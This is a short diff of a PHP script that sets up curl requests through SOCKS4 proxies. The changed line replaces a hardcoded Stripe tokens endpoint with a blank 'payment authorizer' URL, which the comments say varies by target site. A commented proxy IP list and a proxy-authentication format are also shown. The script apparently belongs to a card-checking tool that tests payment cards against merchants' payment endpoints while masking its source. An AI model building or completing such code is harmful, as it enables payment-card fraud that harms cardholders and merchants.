@@ -129,7 +129,7 @@ $proxies [] = '207.229.93.68:1029';*/
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, $proxySocks4);
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens'); ////This may differ from site to site ..mostly same for req-1 based sites
+curl_setopt($ch, CURLOPT_URL, ''); //Site's original payment authorizer .. This may differ from site to site ..mostly same for req-1 based sites
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
 ///curl_setopt($ch, CURLOPT_PROXYUSERPWD, "proxyusername:proxypassword"); <<-- Proxy Authentication Format (Username : Password) -->>
